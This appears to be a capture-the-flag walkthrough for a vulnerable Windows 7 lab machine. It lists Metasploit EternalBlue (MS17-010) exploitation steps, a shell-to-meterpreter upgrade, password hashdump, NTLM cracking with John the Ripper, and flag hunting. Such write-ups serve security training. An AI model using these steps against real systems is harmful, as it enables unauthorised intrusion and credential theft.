### Recon
- How many ports are open with a port number under 1000?<br />
First nmap scan: <br />

      $ nmap 10.10.8.108

Open ports under 1000 are `3`.
- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) <br />
A more accurate scan: <br />

So, after reaserching "Windows 7 Professional 7601 Service Pack 1 microsoft-ds", I found out that this SMB version is vulnerable to `MS17-010`, a.k.a. `EternalBlue`.

### Gain Access
- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
Open msfconsole and `use windows/smb/ms17_010_eternalblue` --> `set lhost your_IP` --> `set rhosts target_IP` --> `exploit`: <br />
- Show options and set the one required value. What is the name of this value? (All caps for submission) `RHOSTS`

### Escalate
- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) `post/multi/manage/shell_to_meterpreter`
- Select this (use MODULE_PATH). Show options, what option are we required to change? `SESSION`

### Cracking
- Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? <br />

`Jon`
- Copy this password hash to a file and research how to crack it. What is the cracked password?  <br />
To crack the password I'm going to use John the Ripper. Copy the line relative to "Jon" in a txt file. In windows password hashes are stored in NTLM format, so the final command is: `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlmhash.txt`. <br />

### Find flags!
- Flag1? This flag can be found at the system root. <br />
Move to `C:\` and run `cat flag1.txt`.
- Flag2? This flag can be found at the location where passwords are stored within Windows. <br />
Passwords are store in the SAM(Security Account Manager) directory, which is located at `C:\Windows\System32\config`.
- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. <br />
I honestly didn't know where to look at, since this is my first windows machine. So I run `search -f flag3.txt` to find the flag, which was in c:\Users\Jon\Documents\flag3.txt. I was actually looking for some sort of administrator account but actually Jon is an administrator, my bad.
